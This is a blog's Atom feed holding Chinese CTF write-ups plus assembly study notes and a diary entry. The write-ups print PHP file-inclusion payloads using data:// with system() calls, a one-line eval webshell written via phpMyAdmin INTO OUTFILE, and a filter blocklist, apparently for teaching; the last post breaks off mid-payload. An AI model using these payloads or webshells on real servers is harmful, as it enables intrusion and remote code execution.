<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scammer</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-12-24T09:18:43.990Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>攻防世界-Web_php_include</title>
    <link href="http://example.com/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_include/"/>
    <id>http://example.com/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_include/</id>
    <published>2022-12-23T16:00:00.000Z</published>
    <updated>2022-12-24T09:18:43.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基础题，多种解法。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><ul><li>strstr()函数<br>查找字符串的首次出现<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strstr(string $haystack, string $needle, bool $before_needle = false): string|fal</span><br><span class="line">返回 haystack 字符串从 needle 第一次出现的位置开始到 haystack 结尾的字符串。</span><br><span class="line">注意:</span><br><span class="line">该函数区分大小写。如果想要不区分大小写，请使用 stristr()。</span><br></pre></td></tr></table></figure></li></ul><p>根据源码可知，我们可以传入两个参数hello,page<br>并且过滤了 <code>php://</code><br>虽然函数定义上区分大小写，但本关中使用大小写绕过并不能成功，于是我们可以换成data:</p><ol start="2"><li>构造payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:text/plain,&lt;?php system(&#x27;ls&#x27;)?&gt;</span><br></pre></td></tr></table></figure></li></ol><ul><li>system()函数<br>执行外部程序，并且显示输出<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">system(string $command, int &amp;$result_code = null): string|false</span><br><span class="line">同 C 版本的 system() 函数一样，本函数执行 command 参数所指定的命令，并且输出执行结果。</span><br><span class="line"></span><br><span class="line">如果 PHP 运行在服务器模块中，system() 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。</span><br><span class="line"></span><br><span class="line">如果要获取一个命令未经任何处理的原始输出，请使用 passthru() 函数。</span><br></pre></td></tr></table></figure></li><li>ls命令<br>ls命令用于显示指定工作目录下之内容（列出目前工作目录所含之文件及子目录)。</li></ul><p>因此该payload可以得到我们所需的文件：fl4gisisish3r3.php<br>之后再次构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:text/plain,&lt;?php system(&#x27;cat fl4gisisish3r3.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p>由此，可以在源码中拿到flag</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>通过扫描后台工具发现phpmyadmin后台<br>打开该后台,进入登录页面：<br><code>http://61.147.171.105:49265/phpmyadmin</code><br>username:root, password为空<br>之后进入SQL语句输入的地方，编辑一句话木马并执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &#x27;/tmp/123.php&#x27;</span><br></pre></td></tr></table></figure><p>使用 SELECT … INTO OUTFILE 语句导出数据到相应文件中。<br>打开蚁剑，url地址输入：<br><code>http://61.147.171.105:49265/?page=/tmp/123.php</code><br>密码为cmd<br>连接成功后，在www目录下找到fl4gisisish3r3.php<br>打开拿到flag</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有些方法可以使用，这里不再列举，可以看看攻防世界的wp。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;基础题，多种解法。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界_web2</title>
    <link href="http://example.com/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web2/"/>
    <id>http://example.com/2022/12/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web2/</id>
    <published>2022-12-23T16:00:00.000Z</published>
    <updated>2022-12-24T07:39:56.160Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一次密码破译，还是比较有趣的。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><ul><li><p>strrev()函数<br>反转字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strrev(string $string): string</span><br><span class="line">返回 string 反转后的字符串。</span><br></pre></td></tr></table></figure></li><li><p>ord()函数<br>转换字符串第一个字节为 0-255 之间的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ord(string $character): int</span><br><span class="line">解析 character 二进制值第一个字节为 0 到 255 范围的无符号整型类型。</span><br><span class="line"></span><br><span class="line">如果字符串是 ASCII、 ISO-8859、Windows 1252之类单字节编码，就等于返回该字符在字符集编码表中的位置。 但请注意，本函数不会去检测字符串的编码，尤其是不会识别类似 UTF-8 或 UTF-16 这种多字节字符的 Unicode 代码点（code point）。</span><br><span class="line"></span><br><span class="line">该函数是 chr() 的互补函数。</span><br></pre></td></tr></table></figure></li><li><p>chr()函数<br>从数字生成单字节字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chr(int $codepoint): string</span><br><span class="line">返回单字符字符串，包含将 codepoint 作为无符号整数解释的指定字符。</span><br><span class="line"></span><br><span class="line">这可用于在一种单字节编码（像是 ASCII、ISO-8859 或 Windows 1252）中通过传递想要的字符在编码映射表中的位置来创建单字符字符串。</span><br><span class="line">但是，注意此函数并不清楚任何字符串编码，特别是无法通过传递一个 Unicode 码位值来生成多字节编码（像是 UTF-8 或 UTF-16）字符串。</span><br><span class="line"></span><br><span class="line">此函数与 ord() 互补。</span><br></pre></td></tr></table></figure></li><li><p>str_rot13()函数<br>对字符串执行 ROT13 转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str_rot13(string $string): string</span><br><span class="line">对 string 参数执行 ROT13 编码并将结果字符串返回。</span><br><span class="line"></span><br><span class="line">ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。</span><br><span class="line">编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</span><br></pre></td></tr></table></figure></li></ul><p>根据提示可知，我们需要通过逆向加密算法解密变量miwen。</p><ol start="2"><li>解密</li></ol><ul><li>rot13解密，得到：(不可忽略字符大小写)<br><code>n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf</code></li><li>倒转后，得到：<br><code>fjg4OjM2ZTFiZzg0MzhlNDE3NTdkOjI5Y2dlYjZlNDhjYEdVRFRPfDtoYm1n</code></li><li>base64解密后，得到：<br>~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg</li><li>所有字符的ASCII顺序减1，得到：<br>}77925d0af7327d30646c918bfda5d37b-FTCSN{:galf</li><li>再次倒转，得到：<br><code>flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</code></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一次密码破译，还是比较有趣的。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/categories/CTF/PHP/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>汇编语言期末复习</title>
    <link href="http://example.com/2022/12/17/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"/>
    <id>http://example.com/2022/12/17/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</id>
    <published>2022-12-16T16:00:00.000Z</published>
    <updated>2022-12-17T15:32:55.036Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>烦内！一到期末就不想复习了，真是的。<br>还是要强迫自己学习哇。</p><span id="more"></span><h1 id="Chapter-1"><a href="#Chapter-1" class="headerlink" title="Chapter 1"></a>Chapter 1</h1><h2 id="源码、反码、补码、移码之间的转换"><a href="#源码、反码、补码、移码之间的转换" class="headerlink" title="源码、反码、补码、移码之间的转换"></a>源码、反码、补码、移码之间的转换</h2><p>源码为正数时，<br>源码&#x3D;反码&#x3D;补码，移码&#x3D;补码+127<br>源码为负数时，<br>反码：符号位不变，其它位取反<br>补码：反码+1<br>移码：补码符号位取反</p><h2 id="有符号字节-amp-字"><a href="#有符号字节-amp-字" class="headerlink" title="有符号字节 &amp; 字"></a>有符号字节 &amp; 字</h2><ul><li>有符号字节<br>数值范围：-128<del>127或-2^7</del>2^7-1</li><li>有符号字<br>数值范围：-32768<del>32767或-2^15</del>2^15-1</li></ul><h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p>计算机采用字符集的方式表示字符。<br>所谓字符集，就是一张映射表，用哪个数字表示哪个符号<br>常用字符集有：ASCII，ANSI，Unicode，GB2312，UTF-8</p><h1 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h1><h2 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h2><ol><li>保护模式。处理器的基本模式，所有指令和特性均相同，程序具备独立的内存段，地址线32位，4GB地址空间。</li><li>虚拟8086模式。是保护模式的一个特例，处理器可以安全地在多任务系统中执行实地址模式的软件，而不会影响其它运行的程序，地址线20位，1MB地址空间。</li><li>实地址模式。具有基本x86处理器环境和一些新增的特性，能够直接访问内存和硬件资源，地址线20位，1MB地址空间。</li><li>系统管理模式。实现电源管理和系统安全等。</li></ol><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p><img src="/simg/Assembly_1.png" alt="通用寄存器"></p><h2 id="状态标志位"><a href="#状态标志位" class="headerlink" title="状态标志位"></a>状态标志位</h2><p>进位标志位(CF)，与目标位置相比，无符号算数运算结果太大时，设置该标志位。<br>溢出标志位(OF)，与目标位置相比，有符号算术运算符太大或太小时，设置该标志位。</p><p>完全不想写了…</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;烦内！一到期末就不想复习了，真是的。&lt;br&gt;还是要强迫自己学习哇。&lt;/p&gt;</summary>
    
    
    
    <category term="汇编语言" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="汇编语言" scheme="http://example.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>走走停停</title>
    <link href="http://example.com/2022/12/16/Diary_1216/"/>
    <id>http://example.com/2022/12/16/Diary_1216/</id>
    <published>2022-12-15T16:00:00.000Z</published>
    <updated>2022-12-16T18:27:10.388Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E6%B3%A2%E5%A5%87_4.png" alt="波奇"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近写日志的频率有点低呢，是不是三分钟热度到期了啊~</p><h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>而世之奇伟、瑰怪，非常之观，常在于险远，而人之所罕至焉，故非有志者不能至也。有志矣，不随以止也，然力不足者，亦不能至也。有志与力，而又不随以怠，至于幽暗昏惑而无物以相之，亦不能至也。<br>--游褒禅山记</p><h1 id="关于隐私"><a href="#关于隐私" class="headerlink" title="关于隐私"></a>关于隐私</h1><p>最近意识到自己隐私的问题欸。可能有感而发，不小心说些现实中的话，尽管只是个小小博客，有心人也能搜集到许多信息吧。<br>由是如此，我想自己要少说些现实中的话，如果实在想说就说得抽象些，懂得人自然明白。还有就是尽量多写自己思考的东西，少写些日常。想想初中时写了一整年日记，当初以为自己会怀念往昔，有些事情写得十分详实，如今也不再看。<br>或许等我再老些时才会厚古薄今吧…</p><h1 id="名言与思考"><a href="#名言与思考" class="headerlink" title="名言与思考"></a>名言与思考</h1><p>所谓名言，在我看来就是将具有哲理意义的话精炼出来。<br>前段时间有人对我说过大概是这样的话：“你只会引用别人的话，自己不会思考。”<br>其实这样说还真引起了我一点小小的思考。平时写日志也是，常常引用一些经典的话语。<br>虽说被人这么说了，我也并不认为引用别人的话就是不会思考。为什么呢？因为既然是名言，那么在某种程度上必然有些道理且是达到高度精炼的，当我的想法恰好与某句名言的想要表达的意思相同时，能有更好的表达，我为什么不用呢？非要拐弯抹角用自己的话再换词造句吗？我想这并不是思考的体现，不过是浪费时间罢了。如同已有轮子了，还要模仿一遍自造轮子。<br>叔本华说：“阅读只是独自思考的代替物。阅读时，一个人本身的思想是在被别人的思想牵引管束。”<br>多年前看到叔本华这么说，我还并不理解，甚至鄙夷。随着阅历的增长，我也慢慢理解了叔本华这样说的原因。的确，凡是能体现思考的书籍，其实都是作者思考后形成的思想，而读者是重新体会了一遍作者思考的过程，就阅读这个过程而言，并不是独立思考。而我们阅读思想书籍的根本目的，并非是掌握思想，而是启发自身思考，强化独立思考能力，成为精神上的君主。<br>而其中高度提炼的句子，就是思考的结晶了。倘若不去阅读思考的过程（书籍），不去亲自思考，只是一昧偏好于这类思考的结晶，最终会如同地基不稳的高楼，只要有风就会摇摇欲坠。当看到两个“自相矛盾”的名言时，是该信哪一个呢？我想无论怎么选都是错的吧。<br>所以说，引用别人的话不代表不会思考，思考也没有捷径可走。</p><h1 id="古今思考"><a href="#古今思考" class="headerlink" title="古今思考"></a>古今思考</h1><p>上面那个话题说着说着来了兴致，又开了一个话题。<br>古代人的思考感觉比现代人都更加深刻，明明现代人接受的信息更加庞大，很多方面却不如古代人。我想正是因为现代人接受信息过于庞大，反而没有精力去思考吧。社会这台庞大的机器在精密运转，它推着人们去工作，去交际，去处理琐事，去娱乐等等。但没有让人思考。灯红酒绿眼花缭乱，思考似乎就被抛掷脑后了。这大概是为什么21世纪没有一个举世闻名的哲学家吧。</p><h1 id="爱的软弱"><a href="#爱的软弱" class="headerlink" title="爱的软弱"></a>爱的软弱</h1><p>今日看漫画时看到了这样一句话：<br>人会为了爱一个人而变得脆弱，但不用为此羞愧，因为这不是真正的软弱。<br>这让我一下子就理解了为什么有些男人会“怕老婆”。我自认为这是一句有道理的话，尽管有所体会，却无法搞清原因。<br>不过啊，在现代社会，这同时也会变得非常麻烦。因为所爱之人无法与己交心的话，往往会演变成一种糟糕的情形，那就是招致对方的反感与轻视。而己方也有可能变化为一种病态的心理。比如现代社会流行的“舔狗”，我想大概是由于爱的软弱演变为病态的心理吧。<br>在这样一个时代，不再是诗歌《从前慢》里所写的那样“车，马，邮件都慢  一生只够爱一个人”。<br>于成年人而言，都是先看别人突出点再斟酌合不合得来。“行就处，不行拉倒”恐怕才是常态吧。<br>想到这，不禁有些感伤呢。也许，某个人对另一人表现出的软弱，实际上是爱的体现呢。可那人能否察觉到这份软弱是爱意并为之珍惜，恐怕要另当别论了。</p><p>想了这么多，可是这和我有什么关系呢？我可真是个笨蛋。</p><h1 id="公信力"><a href="#公信力" class="headerlink" title="公信力"></a>公信力</h1><p>公信力或可信度，包括来源或讯息可信度的客观和主观成分。<br>前段时间有个频道发起了一个讨论，谈论自己认为目前什么具有最大公信力。<br>我随手给出的答案居然得到了广泛认同：广泛流传的小道消息。<br>这也侧面反映出某些方面的糟糕吧。（很晚了，不能再说了）</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>啊，写了整整一个小时，早睡计划泡汤了。明天要好好学习。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E6%B3%A2%E5%A5%87_4.png&quot; alt=&quot;波奇&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>CTFHUB-find_it</title>
    <link href="http://example.com/2022/12/15/CTFHUB-find_it/"/>
    <id>http://example.com/2022/12/15/CTFHUB-find_it/</id>
    <published>2022-12-14T16:00:00.000Z</published>
    <updated>2022-12-15T05:25:06.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要自己的后台扫描工具，手工尝试太慢了…</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>扫描<br>首先拿DirBuster扫描工具扫一下，发现robots.txt<br>访问robots.txt文件，发现了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">When I was a child,I also like to read Robots.txt</span><br><span class="line"></span><br><span class="line">Here is what you want: 1ndexx.php</span><br></pre></td></tr></table></figure><p>但是当我们访问时却失败，于是用工具扫一下缓存<br>得到:1ndexx.php.swp访问成功</p></li><li><p>分析尝试<br>进入后呈现了一堆代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$link</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;ctfhub&#x27;</span>, <span class="string">&#x27;ctfhub&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Hello worldd!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background-color: white;</span><br><span class="line">text-align: center;</span><br><span class="line">padding: <span class="number">50</span>px;</span><br><span class="line">font-family: <span class="string">&quot;Open Sans&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#logo &#123;</span></span><br><span class="line">margin-bottom: <span class="number">40</span>px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img id=<span class="string">&quot;logo&quot;</span> src=<span class="string">&quot;logo.png&quot;</span> /&gt;</span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello My freind!&quot;</span>; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="variable">$link</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">&lt;h2&gt;I Can<span class="string">&#x27;t view my php files?!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; else &#123; ?&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#Really easy...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$a=$_GET[&#x27;</span>code<span class="string">&#x27;];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(preg_match(&#x27;</span>/system|<span class="keyword">eval</span>|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|<span class="function"><span class="keyword">function</span>|<span class="title">call</span>|\~|\^|\`|<span class="title">flag</span>|<span class="title">cat</span>|<span class="title">tac</span>|<span class="title">more</span>|<span class="title">tail</span>|<span class="title">echo</span>|<span class="title">require</span>|<span class="title">include</span>|<span class="title">proc</span>|<span class="title">open</span>|<span class="title">read</span>|<span class="title">shell</span>|<span class="title">file</span>|<span class="title">put</span>|<span class="title">get</span>|<span class="title">contents</span>|<span class="title">dir</span>|<span class="title">link</span>|<span class="title">dl</span>|<span class="title">var</span>|<span class="title">dump</span>/&#x27;,$<span class="title">a</span>))</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&gt;<span class="number">33</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$hack</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$hack</span>,<span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$hack</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看到里面有get型传参code，并且设置了严格的过滤，以及字符长度小于34。<br>传参的code可以写入hack文件。而且flag就在hack文件中<br>当我们直接尝试访问时却无法访问hack.php，这是文件被隐藏了。<br>因为可以写入33个字符的代码，于是我们可以思考写入一段显示hack文件源码的代码。</p></li><li><p>破解<br>以下有三种方法：</p></li></ol><ul><li><p><strong>直接写入 phpinfo()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=&lt;?php 